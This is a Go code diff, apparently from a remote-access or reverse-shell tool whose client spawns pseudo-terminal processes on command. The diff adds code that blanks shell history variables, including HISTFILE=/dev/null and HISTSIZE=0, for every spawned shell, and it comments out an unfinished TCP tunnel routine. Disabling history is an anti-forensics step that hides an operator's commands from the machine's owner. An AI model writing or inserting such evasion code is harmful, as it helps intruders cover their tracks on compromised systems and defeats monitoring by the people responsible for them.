@@ -113,6 +113,18 @@ func handleConnection(c *Client) {
 			}
 			log.Success("Starting process: %s", bodyStartProcess.Path)
 			process := exec.Command(bodyStartProcess.Path)
+
+			// Disable command history
+			process.Env = os.Environ()
+			process.Env = append(process.Env, "HISTORY=")
+			process.Env = append(process.Env, "HISTSIZE=0")
+			process.Env = append(process.Env, "HISTSAVE=")
+			process.Env = append(process.Env, "HISTZONE=")
+			process.Env = append(process.Env, "HISTLOG=")
+			process.Env = append(process.Env, "HISTFILE=")
+			process.Env = append(process.Env, "HISTFILE=/dev/null")
+			process.Env = append(process.Env, "HISTFILESIZE=0")
+
 			windowSize := pty.Winsize{
 				uint16(bodyStartProcess.WindowRows),
 				uint16(bodyStartProcess.WindowColumns),
@@ -263,31 +275,30 @@ func handleConnection(c *Client) {
 				syscall.Kill(termiteProcess.process.Process.Pid, syscall.SIGTERM)
 				termiteProcess.ptmx.Close()
 			}
+			// case message.START_TUNNEL:
+			// case message.TUNNEL_IO:
+			// case message.STOP_TUNNEL:
 		}
-		case message.START_TUNNEL:
-
-		case message.TUNNEL_IO:
-		case message.STOP_TUNNEL:
 	}
 }
 
-// 自定义 Writer 实现 Write 接口，这样下面的代码不用变了
-func Tunnel(host, port) {
-	proxy, err := net.Dial("tcp", fmt.Sprintf("%s:%d", host, port))
-	if err != nil {
-		log.Error(err)
-	}
+// // TODO:
+// func Tunnel(host string, port uint16) {
+// 	proxy, err := net.Dial("tcp", fmt.Sprintf("%s:%d", host, port))
+// 	if err != nil {
+// 		log.Error(err)
+// 	}
 
-	fmt.Println("proxy connected")
-	go copyIO(conn, proxy)
-	go copyIO(proxy, conn)
-}
+// 	fmt.Println("proxy connected")
+// 	go copyIO(conn, proxy)
+// 	go copyIO(proxy, conn)
+// }
 
-func copyIO(src, dst net.Conn) {
-	defer src.Close()
-	defer dst.Close()
-	io.Copy(src, dst)
-}
+// func copyIO(src, dst net.Conn) {
+// 	defer src.Close()
+// 	defer dst.Close()
+// 	io.Copy(src, dst)
+// }
 
 func StartClient() {
 
